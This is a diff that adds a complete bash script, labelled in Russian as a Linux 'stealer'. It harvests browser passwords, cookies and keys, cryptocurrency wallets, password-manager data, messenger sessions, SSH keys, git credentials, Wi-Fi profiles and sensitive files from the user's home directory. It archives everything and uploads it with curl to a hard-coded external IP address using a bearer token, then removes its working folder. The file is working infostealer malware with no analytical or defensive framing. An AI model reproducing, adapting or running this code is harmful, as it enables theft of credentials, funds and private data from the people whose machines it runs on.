@@ -1,0 +1,218 @@
+#!/usr/bin/env bash
+# res1389_linux — стиллер для Linux
+set -euo pipefail
+
+# ============ НАСТРОЙКИ ============
+OUT="/tmp/res1389"
+ZIP="${OUT}/res1389.zip"
+TMP="${OUT}/collect"
+W="${TMP}/work"
+U="${HOME}"
+URL="http://93.152.212.127:8000/upload"
+TOKEN="H2YDEFZh79pJkTxAS_5LMWmn3i6QCP_nVseXnABpr5Y"
+
+# ============ ПОДГОТОВКА ============
+mkdir -p "$W" 2>/dev/null
+rm -f "$ZIP" 2>/dev/null
+
+# ============ HELPER ============
+copyfile() {
+    local src="$1" dst="$2"
+    [[ -f "$src" ]] && cp -f "$src" "$W/$dst" 2>/dev/null || true
+}
+
+copydir() {
+    local src="$1" dst="$2"
+    [[ -d "$src" ]] && cp -rf "$src" "$W/$dst" 2>/dev/null || true
+}
+
+# ============ 1. БРАУЗЕРЫ ============
+# Chrome
+CHROME_D="${U}/.config/google-chrome/Default"
+copyfile "${CHROME_D}/Login Data"       "chrome_login_data"
+copyfile "${CHROME_D}/Web Data"         "chrome_web_data"
+copyfile "${CHROME_D}/Cookies"          "chrome_cookies"
+copyfile "${CHROME_D}/Preferences"      "chrome_preferences"
+copyfile "${CHROME_D}/Bookmarks"        "chrome_bookmarks"
+copyfile "${CHROME_D}/History"          "chrome_history"
+copyfile "${CHROME_D}/Top Sites"        "chrome_top_sites"
+copyfile "${U}/.config/google-chrome/Local State" "chrome_local_state"
+copydir  "${CHROME_D}/Local Extension Settings" "chrome_ext_settings"
+copydir  "${CHROME_D}/Local Storage/leveldb"    "chrome_local_storage"
+copydir  "${CHROME_D}/IndexedDB"                "chrome_indexeddb"
+
+# Edge
+EDGE_D="${U}/.config/microsoft-edge/Default"
+copyfile "${EDGE_D}/Login Data"       "edge_login_data"
+copyfile "${EDGE_D}/Web Data"         "edge_web_data"
+copyfile "${EDGE_D}/Cookies"          "edge_cookies"
+copyfile "${EDGE_D}/Preferences"      "edge_preferences"
+copyfile "${EDGE_D}/Bookmarks"        "edge_bookmarks"
+copyfile "${EDGE_D}/History"          "edge_history"
+copyfile "${U}/.config/microsoft-edge/Local State" "edge_local_state"
+copydir  "${EDGE_D}/Local Extension Settings" "edge_ext_settings"
+copydir  "${EDGE_D}/Local Storage/leveldb"    "edge_local_storage"
+copydir  "${EDGE_D}/IndexedDB"                "edge_indexeddb"
+
+# Brave
+BRAVE_D="${U}/.config/brave-browser/Default"
+copyfile "${BRAVE_D}/Login Data"       "brave_login_data"
+copyfile "${BRAVE_D}/Web Data"         "brave_web_data"
+copyfile "${BRAVE_D}/Cookies"          "brave_cookies"
+copyfile "${BRAVE_D}/History"          "brave_history"
+copyfile "${U}/.config/brave-browser/Local State" "brave_local_state"
+
+# Opera
+OPERA_D="${U}/.config/opera/Default"
+copyfile "${OPERA_D}/Login Data"       "opera_login_data"
+copyfile "${OPERA_D}/Web Data"         "opera_web_data"
+copyfile "${OPERA_D}/Cookies"          "opera_cookies"
+copyfile "${OPERA_D}/History"          "opera_history"
+copyfile "${U}/.config/opera/Local State" "opera_local_state"
+
+# Vivaldi
+VIVALDI_D="${U}/.config/vivaldi/Default"
+copyfile "${VIVALDI_D}/Login Data"     "vivaldi_login_data"
+copyfile "${VIVALDI_D}/Cookies"        "vivaldi_cookies"
+copyfile "${U}/.config/vivaldi/Local State" "vivaldi_local_state"
+
+# Firefox (все профили)
+for profile in "${U}/.mozilla/firefox/"*.default* "${U}/.mozilla/firefox/"*.release*; do
+    [[ -d "$profile" ]] || continue
+    copyfile "${profile}/logins.json"     "firefox_logins"
+    copyfile "${profile}/places.sqlite"   "firefox_places"
+    copyfile "${profile}/cookies.sqlite"  "firefox_cookies"
+    copyfile "${profile}/places.sqlite-wal" "firefox_places_wal"
+    copyfile "${profile}/prefs.js"        "firefox_prefs"
+    copyfile "${profile}/key4.db"         "firefox_key4db"
+    copyfile "${profile}/cert9.db"        "firefox_cert9db"
+done
+
+# ============ 2. КРИПТОКОШЕЛЬКИ ============
+copyfile "${U}/.bitcoin/wallet.dat"   "bitcoin_wallet_dat"
+copyfile "${U}/.bitcoin/bitcoin.conf" "bitcoin_conf"
+copydir  "${U}/.electrum"             "electrum"
+copydir  "${U}/.monero/wallets"       "monero_wallets"
+copydir  "${U}/.zcash"               "zcash"
+copydir  "${U}/.config/Trust Wallet"  "trust_wallet"
+copydir  "${U}/.config/Exodus"        "exodus"
+copydir  "${U}/.config/Atomic Wallet" "atomic_wallet"
+copydir  "${U}/.config/Trezor"        "trezor"
+copydir  "${U}/.config/Ledger"        "ledger"
+
+# ============ 3. МЕНЕДЖЕРЫ ПАРОЛЕЙ ============
+copydir "${U}/.config/1Password"      "1password"
+copydir "${U}/.config/bitwarden"      "bitwarden"
+copydir "${U}/.local/share/keepassxc" "keepassxc"
+copydir "${U}/.config/keepass2"       "keepass2"
+copydir "${U}/.config/lastpass"       "lastpass"
+
+# ============ 4. МЕССЕНДЖЕРЫ ============
+copydir "${U}/.local/share/TelegramDesktop/tdata" "telegram_tdata"
+copyfile "${U}/.local/share/TelegramDesktop/settings.json" "telegram_settings"
+copydir "${U}/.config/discord"         "discord_config"
+copydir "${U}/.config/discord/Local Storage" "discord_local_storage"
+copydir "${U}/.config/discord/desktop_core"   "discord_desktop_core"
+copydir "${U}/.config/WhatsApp"      "whatsapp"
+copydir "${U}/.config/Signal"        "signal"
+
+# ============ 5. ПОЧТОВЫЕ КЛИЕНТЫ ============
+for profile in "${U}/.thunderbird/"*.default* "${U}/.thunderbird/"*.release*; do
+    [[ -d "$profile" ]] || continue
+    copyfile "${profile}/logins.json" "thunderbird_logins"
+    copyfile "${profile}/key4.db"     "thunderbird_key4db"
+    copyfile "${profile}/prefs.js"    "thunderbird_prefs"
+done
+copydir "${U}/.config/thunderbird" "thunderbird_config"
+
+# ============ 6. ИГРОВЫЕ АККАУНТЫ ============
+copydir "${U}/.local/share/Steam"           "steam"
+copydir "${U}/.config/Steam"                "steam_config"
+copydir "${U}/.config/riot-ux"              "riot"
+copydir "${U}/.config/EpicGamesLauncher"    "epic"
+copydir "${U}/.config/Battle.net"           "battlenet"
+copydir "${U}/.config/EA Desktop"           "ea_desktop"
+
+# ============ 7. УЧЁТНЫЕ ДАННЫЕ СИСТЕМЫ ============
+# WiFi
+if command -v nmcli &>/dev/null; then
+    nmcli -g NAME,SECURITY,CONNECTIONS connection show --active > "$W/wifi_nmcli.txt" 2>/dev/null || true
+    for conn in $(nmcli -g NAME connection show 2>/dev/null); do
+        nmcli connection show "$conn" > "$W/wifi_conn_${conn}.txt" 2>/dev/null || true
+    done
+fi
+if command -v iwget &>/dev/null; then
+    iwget -l > "$W/wifi_iwget.txt" 2>/dev/null || true
+fi
+
+# SSH
+copydir "${U}/.ssh" "ssh"
+
+# Git / Netrc
+copyfile "${U}/.git-credentials" "git_credentials"
+copyfile "${U}/.gitconfig"       "gitconfig"
+copyfile "${U}/.netrc"           "netrc"
+copyfile "${U}/.config/git/credentials" "git_credentials_config"
+
+# RDP / VNC
+copydir "${U}/.vnc" "vnc"
+copyfile "${U}/.config/Remmina/remmina.conf" "remmina_conf"
+
+# Cloud sync
+copydir "${U}/.config/onedrive" "onedrive"
+copydir "${U}/Dropbox"          "dropbox"
+copydir "${U}/.config/google-drive" "gdrive"
+
+# ============ 8. ФАЙЛЫ НА ДИСКЕ ============
+copydir "${U}/Desktop"   "desktop"
+copydir "${U}/Downloads" "downloads"
+copydir "${U}/Documents" "documents"
+
+# Чувствительные файлы (по расширению и ключевым словам)
+SENSITIVE_EXTS=(.key .pem .p12 .pfx .keystore .kdbx .dat .json .xlsx .docx .pdf .psd .env)
+SENSITIVE_KW=(password secret token key wallet backup)
+
+find "$U" -maxdepth 6 -type f -size -50M \
+    ! -path "*/node_modules/*" \
+    ! -path "*/.git/*" \
+    ! -path "*/.cache/*" \
+    ! -path "*/.local/share/Trash/*" \
+    ! -path "*/.npm/*" \
+    ! -path "*/.cargo/registry/*" \
+    2>/dev/null | while read -r f; do
+    fname=$(basename "$f")
+    fext=".${fname##*.}"
+    flower=$(echo "$fname" | tr '[:upper:]' '[:lower:]')
+
+    match=0
+    for ext in "${SENSITIVE_EXTS[@]}"; do
+        [[ "$fext" == "$ext" ]] && match=1 && break
+    done
+    if [[ $match -eq 0 ]]; then
+        for kw in "${SENSITIVE_KW[@]}"; do
+            [[ "$flower" == *"$kw"* ]] && match=1 && break
+        done
+    fi
+
+    if [[ $match -eq 1 ]]; then
+        cp -f "$f" "$W/$(printf '%04d' $RANDOM)_${fname}" 2>/dev/null || true
+    fi
+done
+
+# ============ АРХИВАЦИЯ ============
+if [[ -z "$(ls -A "$W" 2>/dev/null)" ]]; then
+    rm -rf "$TMP"
+    exit 1
+fi
+
+cd "$W"
+zip -r -q "$ZIP" . 2>/dev/null || tar czf "${ZIP%.zip}.tar.gz" . 2>/dev/null
+
+# ============ ОТПРАВКА ============
+curl -s -o /dev/null -X POST "$URL" \
+    -H "Authorization: Bearer $TOKEN" \
+    -F "file=@$ZIP;type=application/zip"
+
+# ============ ЧИСТКА ============
+rm -rf "$TMP"
+exit 0
